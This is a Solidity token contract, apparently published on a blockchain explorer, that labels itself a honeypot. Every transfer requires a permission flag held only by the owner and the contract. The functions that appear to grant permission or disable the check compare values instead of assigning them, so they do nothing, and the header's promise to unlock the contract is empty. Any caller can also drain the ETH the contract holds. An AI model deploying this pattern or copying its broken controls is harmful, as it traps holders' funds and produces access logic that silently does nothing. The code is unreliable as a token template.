/**
 *Submitted for verification at polygonscan.com on 2021-09-19
*/

// SPDX-License-Identifier: MIT
// Codes from @openzeppelin/contracts included

/**BEWARE: This contract is a pure honeypot! 
 * As the owner, I will never publish this token on any social-media platform! 
 * And you shall not too! 
 * I will (most likely) unlock the contract if I see you are a human.
 * You can send email to [email protected] to ask for return of your exchanged tokens.
 */

/** You can also put your eth here, or take it away. 
 * To be noticed, EVERYONE has permission to take stuck eth.
 */ 

pragma solidity ^0.8.0;

contract flyingCashToken{
    address _owner;
    
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    mapping (address => bool) private _permission;

    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _name;
    string private _symbol;
    bool private _verifying;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Permission(address indexed adr);
    event Verifying(bool on);
    
    constructor() {
        _owner = msg.sender;
        _name = unicode"💸";
        _symbol = unicode"💸";
        _decimals = 18;
        _mint (_owner, _totalSupply);
        _verifying = true;
        _permission[_owner] = true;
        _permission[address(this)] = true;
    }


//The token
    modifier onlyOwner(){
        require(msg.sender == _owner);
        _;
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }
    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }
    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }
    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }
    function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account];
    }
    function permissioncheck(address adr) public view virtual returns(bool){
        return _permission[adr];
    }
    
    
//About msg
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }


//About token
    function transfer(address recipient, uint256 amount) public virtual returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public virtual returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);
        return true;
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        return true;
    }
    function _transfer(address sender, address recipient, uint256 amount) internal virtual{
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, amount);
        
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(address adr, uint256 amount) internal virtual {
        require(amount != 0);
        if (_verifying){
        require(_permission[adr]==true);
        }
    }
    
    //Permission
    function _givepermission(address adr) onlyOwner public virtual returns (bool){
        _permission[adr] == true;
        emit Permission(adr);
        return true;
    }
    
    function _switchverify (bool bl) public virtual returns (bool){
        _verifying == bl;
        emit Verifying(bl);
        return true;
    }
    
    
    
//About eth.
    receive () external payable {}
    
    function takeStuckEth() public {
        payable(msg.sender).transfer(address(this).balance);
    }
    
    function _selfdestruct () onlyOwner public{
        
        selfdestruct(payable(_owner));
    }
    
}